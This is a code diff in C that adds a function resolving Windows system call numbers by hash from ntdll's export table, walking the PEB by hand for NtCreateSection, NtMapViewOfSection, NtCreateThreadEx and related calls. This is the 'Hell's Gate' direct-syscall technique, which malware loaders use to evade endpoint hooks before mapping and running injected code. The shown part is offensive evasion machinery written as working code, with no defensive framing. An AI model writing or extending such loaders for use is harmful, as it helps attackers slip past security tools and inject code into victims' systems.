@@ -63,3 +63,61 @@ BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDire
 
 	return TRUE;
 }
+
+VX_TABLE g_SyscallsTable = { 0 };
+
+BOOL InitializeSyscalls() {
+	printf("[i] Initializing Syscalls Table...\n");
+
+	// Get the PEB
+	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
+		return FALSE;
+
+	// Get NTDLL module 
+	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
+	PVOID ntDllBaseAddress = pLdrDataEntry->DllBase;
+	if (!ntDllBaseAddress)
+		return FALSE;
+
+	// Get the EAT of NTDLL
+	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
+		return FALSE;
+
+	// Initialize the syscalls table
+	g_SyscallsTable.NtCreateSection.dwHash = NtCreateSectionHashValue;
+	g_SyscallsTable.NtMapViewOfSection.dwHash = NtMapViewOfSectionHashValue;
+	g_SyscallsTable.NtUnmapViewOfSection.dwHash = NtUnmapViewOfSectionHashValue;
+	g_SyscallsTable.NtClose.dwHash = NtCloseHashValue;
+	g_SyscallsTable.NtCreateThreadEx.dwHash = NtCreateThreadExHashValue;
+	g_SyscallsTable.NtWaitForSingleObject.dwHash = NtWaitForSingleObjectHashValue;
+	g_SyscallsTable.NtQuerySystemInformation.dwHash = NtQuerySystemInformationHashValue;
+
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateSection))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtMapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtUnmapViewOfSection))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtClose))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtCreateThreadEx))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtWaitForSingleObject))
+		return FALSE;
+	if (!GetVxTableEntry(ntDllBaseAddress, pImageExportDirectory, &g_SyscallsTable.NtQuerySystemInformation))
+		return FALSE;
+
+	printf("[+] DONE!\n");
+	printf("[+] SSN Of The NtCreateSection: %d\n", g_SyscallsTable.NtCreateSection.wSystemCall);
+	printf("[+] SSN Of The NtMapViewOfSection: %d\n", g_SyscallsTable.NtMapViewOfSection.wSystemCall);
+	printf("[+] SSN Of The NtUnmapViewOfSection: %d\n", g_SyscallsTable.NtUnmapViewOfSection.wSystemCall);
+	printf("[+] SSN Of The NtClose: %d\n", g_SyscallsTable.NtClose.wSystemCall);
+	printf("[+] SSN Of The NtCreateThreadEx: %d\n", g_SyscallsTable.NtCreateThreadEx.wSystemCall);
+	printf("[+] SSN Of The NtWaitForSingleObject: %d\n", g_SyscallsTable.NtWaitForSingleObject.wSystemCall);
+	printf("[+] SSN Of The NtQuerySystemInformation: %d\n", g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
+
+	return TRUE;
+}
